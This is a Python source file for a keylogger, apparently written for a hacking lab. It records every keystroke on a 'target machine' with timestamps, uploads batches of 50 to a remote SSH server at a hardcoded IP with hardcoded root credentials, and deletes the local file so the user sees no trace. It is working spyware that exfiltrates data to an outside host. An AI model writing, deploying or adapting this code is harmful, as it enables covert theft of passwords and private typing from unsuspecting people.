from pynput.keyboard import Key, Listener
from datetime import datetime
from server import Server
import os


class Logger:
    """
    The Logger class provides methods to deploy the keylogger on the target machine.
    """

    def __init__(self) -> None:
        """
        Initializes the data required for the keylogger operation.
        """

        # List of keyboard keys typed
        self.keys = []
        # Number of keyboard keys typed
        self.count = 0
        # Current time written as 'HH:MM:SS.ssssss'
        self.time = str(datetime.now().time())

    def record_data(self, filename: str) -> None:
        """
        Writes the keyboard keys that have been typed into a file.

        :param filename: local file name
        """

        with open(filename, 'w') as f:
            f.writelines('\n'.join(self.keys))
    
    def send_data(self, filename: str, directory: str) -> None:
        """
        Transfers the data saved in a local to a remote SSH server.

        :param filename: local file name
        :param directory: remote directory name
        """

        # Writing of the keystrokes logging into a file
        self.record_data(filename=filename)

        # Setting up the authentication data to the Linode remote machine hosted at the IP address 178.79.179.232
        server = Server(hostname='178.79.179.232', username='root', password='hacking-lab_password')
        # Making a directory on the remote machine
        server.make_remote_directory(directory=directory)

        # Transferring the local file to the remote machine
        server.transfer_file(local=filename, remote=directory)

        # Deletion of the file on the local machine to leave no suspicious trace in the eyes of the user
        os.remove(filename)
    
    def on_press(self, key: Key) -> None:
        """
        Records every keystorkes thanks to the pynput.keyboard.Key class.

        :param key: digital code of the keyboard key pressed by the user
        """

        s = str(key)

        # Keyboard key is not a character
        if s.find('Key') == 0:
            s = '[' + s.split('.')[1].upper() + ']'
        # Keyboard key is a character
        else:
            # Keyboard key is simple quote
            if s == '"\'"':
                s = '\''
            # Keyboard key is any other character
            else:
                s = s.replace('\'', '')

        # Add to the list the keyboard key and the time it was pressed
        self.keys.append(f'{str(datetime.now())}: {s}')
        # Incrementing counter
        self.count += 1

        # The hacker receives on their SSH server files containing 50 keyboard keys
        if self.count >= 50:
            # The file name is the time when the keylogger data have been reset
            filename = self.time.replace(':', '.')

            # Current date
            date = str(datetime.now().date())

            # Sending data to the remote SSH server
            self.send_data(filename=filename, directory=f'/home/root/data/logging/{date}')

            # Resetting keylogger data
            self.keys = []
            self.count = 0
            self.time = str(datetime.now().time())
    
    def enable(self) -> None:
        """
        Enables the keylogger on the target machine.
        """

        with Listener(on_press=self.on_press) as listener:
            listener.join()
